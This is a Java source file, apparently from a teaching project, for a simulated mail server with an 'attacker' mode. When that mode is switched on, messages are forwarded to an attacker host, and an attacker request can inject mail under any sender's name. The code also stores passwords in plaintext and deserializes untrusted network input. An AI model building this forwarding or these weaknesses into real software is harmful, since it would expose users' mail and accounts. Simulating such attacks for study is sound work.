/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package mailserver;

import utils.attackerip;
import dbserver.dbcon;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.util.ArrayList;
import java.util.Vector;
import javax.swing.JOptionPane;
import javax.swing.table.DefaultTableModel;

/**
 *
 * @author Lenovo
 */
public class processreq extends Thread
{
    Connection con;
    mailServer obj;
    DefaultTableModel dft1;
    
    processreq(mailServer m)
    {
        super();
        obj=m;
        dft1=(DefaultTableModel)obj.jTable1.getModel();
        con=new dbcon().connect();
        
        start();
        
        refreshblocklist();
    }
    
    void refreshblocklist()
    {
        try
        {
            obj.jList1.removeAll();
            PreparedStatement pst=con.prepareStatement("select * from blocked");
            ResultSet rs=pst.executeQuery();
            
            Vector v=new Vector();
            while (rs.next())
            {
                v.add(rs.getString(1).trim());
            }
            obj.jList1.setListData(v);
        }
        catch(Exception e)
        {
            System.out.println(e);
            e.printStackTrace();
        }
    }
    
    public void run()
    {
        try
        {
             
            ServerSocket ss=new ServerSocket(2000);
            while (true)
            {
                Socket soc=ss.accept();
                
                ObjectOutputStream oos=new ObjectOutputStream(soc.getOutputStream());
                ObjectInputStream oin=new ObjectInputStream(soc.getInputStream());
                
                
                String req=(String)oin.readObject();
                
                if (req.equals("REGISTER"))
                {
                   String fname=(String)oin.readObject(); 
                   String lname=(String)oin.readObject(); 
                   String dob=(String)oin.readObject(); 
                   String address=(String)oin.readObject(); 
                   String no=(String)oin.readObject(); 
                   String uname=(String)oin.readObject(); 
                   String pass=(String)oin.readObject(); 
                   
                   Vector v=new Vector();
                   v.add(req);
                   v.add(uname);
                   
                   String reply=checkuser(uname);
                   
                   if (reply.equals("EXIST"))
                   {
                       oos.writeObject("ALREADY");
                       v.add("FAILED");
                       
                      dft1.addRow(v);
                       
                   }
                   else
                   {
                       PreparedStatement pst=con.prepareStatement("insert into register values(?,?,?,?,?,?,?)");
                       pst.setString(1,fname);
                       pst.setString(2,lname);
                       pst.setString(3,dob);
                       pst.setString(4,address);
                       pst.setString(5,no);
                       pst.setString(6,uname);
                       pst.setString(7,pass);
                       pst.executeUpdate();
                       
                       oos.writeObject("SUCCESS");
                       v.add("SUCCESS");
                        dft1.addRow(v);
                   }
                }
                else
                if (req.equals("LOGIN"))
                {
                    String uname=(String)oin.readObject(); 
                    String pass=(String)oin.readObject(); 
                   
                    Vector v=new Vector();
                    v.add(req);
                    v.add(uname);
                    
                    PreparedStatement pst=con.prepareStatement("select * from register where uname=? and pass=?");
                    pst.setString(1,uname);
                    pst.setString(2,pass);
                    ResultSet rs=pst.executeQuery();
                    
                    if (rs.next())
                    {
                      oos.writeObject("SUCCESS");
                      v.add("SUCCESS");
                      dft1.addRow(v);
                    }
                    else
                    {
                        oos.writeObject("FAILED");
                        v.add("FAILED");
                        dft1.addRow(v);
                    }
                    
                }
                else
                if (req.equals("USERSLIST"))
                {
                    String uname=(String)oin.readObject();
                    
                    PreparedStatement pst=con.prepareStatement("select uname from register where uname<>?");
                    pst.setString(1,uname);
                    ResultSet rs=pst.executeQuery();
                    
                    Vector v=new Vector();
                    while (rs.next())
                    {
                        v.add(rs.getString(1).trim());
                    }
                    System.out.println("size: "+v.size());
                    oos.writeObject(v);
                }
                else
                if (req.equals("REFRESHMAILS"))
                {
                    String uname=(String)oin.readObject();
                    PreparedStatement pst=con.prepareStatement("select * from inbox where receiver=?");
                    pst.setString(1,uname);
                    ResultSet rs=pst.executeQuery();
                    
                    Vector inbox=new Vector();
                    while (rs.next())
                    {
                        ArrayList a=new ArrayList();
                        a.add(rs.getString(1).trim());
                        a.add(rs.getString(2).trim());
                        a.add(rs.getString(3).trim());
                        a.add(rs.getString(4).trim());
                        a.add(rs.getString(5).trim());
                        a.add(rs.getString(6).trim());
                        
                        inbox.add(a);
                    }
                    
                    oos.writeObject(inbox);
                    
                    
                    PreparedStatement pst2=con.prepareStatement("select * from outbox where sender=?");
                    pst2.setString(1,uname);
                    ResultSet rs2=pst2.executeQuery();
                    Vector outbox=new Vector();
                    while (rs2.next())
                    {
                        ArrayList a=new ArrayList();
                        a.add(rs2.getString(1).trim());
                        a.add(rs2.getString(2).trim());
                        a.add(rs2.getString(3).trim());
                        a.add(rs2.getString(4).trim());
                        a.add(rs2.getString(5).trim());
                        a.add(rs2.getString(6).trim());
                        
                        outbox.add(a);
                    }
                    System.out.println("outbox: "+outbox.size());
                    
                    oos.writeObject(outbox);
                        
                }
                else
                if (req.equals("MAIL"))
                {
                    Vector v=new Vector();
                    v.add("MAIL");
                    String sender=(String)oin.readObject();
                    String receiver=(String)oin.readObject();
                    String sub=(String)oin.readObject();
                    String msg=(String)oin.readObject();
                    String sign=(String)oin.readObject();
                    String ip=(String)oin.readObject();
                    String eip=(String)oin.readObject();
                    
                    v.add(sender+"/"+receiver);
                    
                    String status=checkblocked(sender);
                    if (status.equals("BLOCKED"))
                    {
                        oos.writeObject("BLOCKED");
                        v.add("SENDER BLOCKED");
                        
                        
                    }
                    else
                    {
                        String rstatus=checkblocked(receiver);
                        if (rstatus.equals("BLOCKED"))
                        {
                            oos.writeObject("RECEIVERBLOCKED");
                            v.add("RECEIVER BLOCKED");
                        }
                        else
                        {
                            if (ip.equals(eip))
                            {
                                if (obj.jCheckBox1.isSelected())
                                {
                                    oos.writeObject("SUCCESS");
                                   forwardtoattacker(sender,receiver,sub,msg,sign);
                                   v.add("FWD TO ATTACKER");
                                }
                                else //forwared to receiver
                                {
                                    String d=new java.util.Date().toString();
                                    PreparedStatement pst=con.prepareStatement("insert into inbox values(?,?,?,?,?,?)");
                                    pst.setString(1, sender);
                                    pst.setString(2, receiver);
                                    pst.setString(3, sub);
                                    pst.setString(4, msg);
                                    pst.setString(5, sign);
                                    pst.setString(6, d);
                                    pst.executeUpdate();
                                    
                                    PreparedStatement pst2=con.prepareStatement("insert into outbox values(?,?,?,?,?,?)");
                                    pst2.setString(1, sender);
                                    pst2.setString(2, receiver);
                                    pst2.setString(3, sub);
                                    pst2.setString(4, msg);
                                    pst2.setString(5, sign);
                                    pst2.setString(6, d);
                                    pst2.executeUpdate();
                                    
                                    oos.writeObject("SUCCESS");
                                    v.add("SUCCESS");
                                }
                            }
                            else
                            {
                                oos.writeObject("INVALIDIP");
                                v.add("INVALID IP ENTERED");
                                
                                PreparedStatement pst=con.prepareStatement("insert into blocked values(?)");
                                pst.setString(1,sender);
                                pst.executeUpdate();
                        
                                refreshblocklist();
                            }
                        }
                    }
                    
                    dft1.addRow(v);
                }
                else
                if (req.equals("ATTACKERMAIL"))
                {
                    String sender=(String)oin.readObject();
                    String receiver=(String)oin.readObject();
                    String sub=(String)oin.readObject();
                    String msg=(String)oin.readObject();
                    String sign=(String)oin.readObject();
                    
                    String d=new java.util.Date().toString();
                    PreparedStatement pst=con.prepareStatement("insert into inbox values(?,?,?,?,?,?)");
                    pst.setString(1, sender);
                    pst.setString(2, receiver);
                    pst.setString(3, sub);
                    pst.setString(4, msg);
                    pst.setString(5, sign);
                    pst.setString(6, d);
                    pst.executeUpdate();
                                    
                    PreparedStatement pst2=con.prepareStatement("insert into outbox values(?,?,?,?,?,?)");
                    pst2.setString(1, sender);
                    pst2.setString(2, receiver);
                    pst2.setString(3, sub);
                    pst2.setString(4, msg);
                    pst2.setString(5, sign);
                    pst2.setString(6, d);
                    pst2.executeUpdate();
                    
                    oos.writeObject("SUCCESS");
                    
                    Vector v=new Vector();
                    v.add("ATTACKERMAIL");
                    v.add(sender+"/"+receiver);
                    v.add("SAVED");
                    dft1.addRow(v);
                }
                
                
                    
                
                oin.close();
                oos.close();
                soc.close();
            }
            
        }
        catch(Exception e)
        {
            System.out.println(e);
            e.printStackTrace();
        }
    }
    
    String checkblocked(String uname)
    {
        String reply="BLOCKED";
        try
        {
            PreparedStatement pst=con.prepareStatement("select * from blocked where uname=?");
            pst.setString(1,uname);
            ResultSet rs=pst.executeQuery();
            
            if (rs.next())
                reply="BLOCKED";
            else
                reply="NOTBLOCKED";
        }
        catch(Exception e)
        {
            System.out.println(e);
            e.printStackTrace();
        }
        return reply;
    }
    
    String checkuser(String uname)
    {
        String reply="EXIST";
        try
        {
            PreparedStatement pst=con.prepareStatement("select * from register where uname=?");
            pst.setString(1,uname);
            ResultSet rs=pst.executeQuery();
            
            if (rs.next())
                reply="EXIST";
            else
                reply="NOTEXIST";
        }
        catch(Exception e)
        {
            System.out.println(e);
            e.printStackTrace();
        }
        return reply;
    }
    
    
    void forwardtoattacker(String sender,String receiver,String sub,String msg,String sign)
    {
        try
        {
            Socket soc=new Socket(attackerip.ip,attackerip.port);
            ObjectInputStream oin=new ObjectInputStream(soc.getInputStream());
            ObjectOutputStream oos=new ObjectOutputStream(soc.getOutputStream());
            
            oos.writeObject("MAIL");
            oos.writeObject(sender);
            oos.writeObject(receiver);
            oos.writeObject(sub);
            oos.writeObject(msg);
            oos.writeObject(sign);
            
            String reply=(String)oin.readObject();
            
            if (reply.equals("SUCCESS"))
            {
                JOptionPane.showMessageDialog(obj,"Mail forwarded to attacker!");
            }
        }
        catch(Exception e)
        {
            System.out.println(e);
            e.printStackTrace();
            JOptionPane.showMessageDialog(obj,"Error in connecting to Attacker Module!");
        }
    }
    
}
